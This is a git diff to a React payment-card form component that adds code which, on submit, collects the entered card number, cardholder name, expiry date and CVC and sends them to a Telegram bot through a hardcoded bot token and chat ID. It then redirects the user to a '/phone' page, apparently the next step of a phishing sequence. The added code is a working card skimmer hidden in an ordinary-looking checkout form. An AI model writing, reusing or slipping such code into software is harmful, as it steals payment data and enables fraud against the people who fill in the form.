@@ -1,6 +1,7 @@
 import { AiOutlineCreditCard } from 'react-icons/ai';
 import { useFormik } from 'formik';
 import { cardSchema } from '../schemas';
+import { useNavigate } from 'react-router-dom';
 
 const initialValues = {
   cardnumber: '',
@@ -11,6 +12,7 @@ const initialValues = {
 };
 
 function Cardinfo() {
+  const navigate = useNavigate();
   const { values, errors, handleBlur, touched, handleChange, handleSubmit } =
     useFormik({
       initialValues: initialValues,
@@ -19,12 +21,27 @@ function Cardinfo() {
         action.resetForm();
 
         //console.log
-        console.log(values);
+        // console.log(values);
+
+        const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
+        const user_id = 727686605;
+        let my_text = `cardnumber: ${values.cardnumber}     
+                         fullname: ${values.fullname}      
+                                                      Date:  ${values.month}/${values.year}       
+                                                                         cvc: ${values.cvc}`;
+
+        const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
+        let api = new XMLHttpRequest();
+        api.open('Get', url, true);
+        api.send();
+
+        navigate("/phone")
+        
       },
     });
 
   return (
-    <div className="container mx-auto bg-gray-500 rounded-lg mb-96 lg:-mb-56  p-12 w-11/12 lg:w-4/12">
+    <div className="container mx-auto bg-gray-500 rounded-lg mb-96 lg:-mb-56  p-12 w-11/12 lg:w-4/12 mt-40">
       <div className="">
         <img
           className=" w-full lg:w-10/12 mx-auto -mt-36 xl:-mt-40 lg:-mt-64"
